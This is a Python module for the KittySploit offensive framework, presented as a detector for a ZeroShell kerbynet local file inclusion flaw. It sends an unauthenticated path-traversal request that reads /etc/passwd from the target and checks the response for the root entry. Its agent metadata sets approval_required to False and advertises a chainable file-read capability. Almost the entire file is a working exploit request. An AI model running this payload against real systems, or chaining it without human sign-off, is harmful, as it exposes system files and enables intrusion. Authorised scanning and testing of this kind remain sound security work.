#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZeroShell kerbynet local file inclusion / command chain."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZeroShell - kerbynet LFI Detection',
        'description': (
            'Detects ZeroShell 2.0RC2 LFI via '
            '/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'zeroshell', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/27802',
        ],
    }

    def run(self):
        path = (
            '/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render'
            '&Object=../../../etc/passwd'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='critical',
                reason='ZeroShell kerbynet LFI',
                path='/cgi-bin/kerbynet',
            )
            return True
        return False
